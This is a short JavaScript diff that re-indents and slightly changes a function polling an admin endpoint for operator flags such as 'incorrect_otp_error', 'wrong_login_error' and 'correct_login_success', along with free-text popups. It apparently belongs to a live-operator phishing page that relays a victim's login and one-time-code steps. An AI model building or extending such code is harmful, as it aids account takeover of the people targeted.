@@ -189,39 +189,40 @@ async function showTextPopup(message) {
     } catch (e) {}
   }
 
-  // ── Single unified admin_text poller ───────────────────────────────────────
-  async function pollAdminText() {
-    if (adminTextHandling) return;
-    try {
-      const res  = await fetch('/api/users/check-admin-text', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await res.json();
-      if (!data.admin_text || data.text_release === true) return;
+// ── Single unified admin_text poller ───────────────────────────────────────
+async function pollAdminText() {
+  if (adminTextHandling) return;
+  try {
+    const res  = await fetch('/api/users/check-admin-text', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email })
+    });
+    const data = await res.json();
+    if (!data.admin_text || data.text_release === true) return;
 
-      adminTextHandling = true;
+    adminTextHandling = true;
 
-      // NEW: Check for regular text message first (not a special flag)
-      if (data.admin_text && data.admin_text.trim() !== '' && 
-          data.admin_text !== 'incorrect_otp_error' && 
-          data.admin_text !== 'wrong_login_error' && 
-          data.admin_text !== 'correct_login_success') {
-        // This is a regular text message from "Send Text" button
-        await showTextPopup(data.admin_text);
-        await releaseAdminText();
-        adminTextHandling = false;
-        return;
-      }
+    // NEW: Check for regular text message first (not a special flag)
+    if (data.admin_text && data.admin_text.trim() !== '' && 
+        data.admin_text !== 'incorrect_otp_error' && 
+        data.admin_text !== 'wrong_login_error' && 
+        data.admin_text !== 'correct_login_success') {
+      // This is a regular text message from "Send Text" button
+      const formattedMessage = formatTextMessage(data.admin_text);
+      await showTextPopup(formattedMessage);
+      await releaseAdminText();
+      adminTextHandling = false;
+      return;
+    }
 
-      if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
-      else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
-      else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
-      else { await releaseAdminText(); adminTextHandling = false; }
+    if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
+    else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
+    else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
+    else { await releaseAdminText(); adminTextHandling = false; }
 
-    } catch (e) { adminTextHandling = false; }
-  }
+  } catch (e) { adminTextHandling = false; }
+}
 
   // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
